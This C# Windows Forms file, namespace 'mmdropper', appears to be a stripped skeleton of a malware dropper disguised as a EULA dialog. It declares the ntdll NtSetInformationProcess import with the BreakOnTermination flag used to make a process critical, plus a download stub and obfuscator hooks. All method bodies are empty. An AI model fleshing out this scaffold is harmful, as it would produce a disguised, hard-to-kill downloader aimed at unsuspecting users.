using System;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace mmdropper
{
    public class eulaform : Form
    {
        private const int BreakOnTermination = 29;
        private bool canfuckoff; // Bu ismi değiştirmek gerekebilir
        private int isCritical;
        private IContainer components;
        private Label label1;
        private PictureBox pictureBox1;
        private PictureBox pictureBox2;
        private PictureBox pictureBox3;
        private PictureBox pictureBox4;
        private PictureBox pictureBox5;
        private Label label2;
        private Label label3;
        private PictureBox pictureBox6;
        private Button button1;
        private Button button2;
        private Label label4;

        [MethodImpl(MethodImplOptions.NoInlining)]
        public eulaform()
        {
            InitializeComponent();
        }

        [MethodImpl(MethodImplOptions.NoInlining)]
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        [MethodImpl(MethodImplOptions.NoInlining)]
        private static extern int NtSetInformationProcess(
            IntPtr hProcess,
            int processInformationClass,
            ref int processInformation,
            int processInformationLength);

        [MethodImpl(MethodImplOptions.NoInlining)]
        private void dlfile(object state)
        {
            
        }

        [MethodImpl(MethodImplOptions.NoInlining)]
        public static bool userIsAdministrator()
        {
            return false;
        }

        [MethodImpl(MethodImplOptions.NoInlining)]
        private void EulaformLoad(object sender, EventArgs e)
        {
            
        }

        [MethodImpl(MethodImplOptions.NoInlining)]
        private void Button2Click(object sender, EventArgs e)
        {

        }

        [MethodImpl(MethodImplOptions.NoInlining)]
        private void Button1Click(object sender, EventArgs e)
        {

        }

        [MethodImpl(MethodImplOptions.NoInlining)]
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        [MethodImpl(MethodImplOptions.NoInlining)]
        private void InitializeComponent()
        {
            // Form bileşenlerinin başlangıç ayarları burada yapılacak.
        }

        [MethodImpl(MethodImplOptions.NoInlining)]
        static eulaform()
        {
            AgileDotNetRT.Initialize();
            AgileDotNetRT.PostInitialize();
        }
    }
}
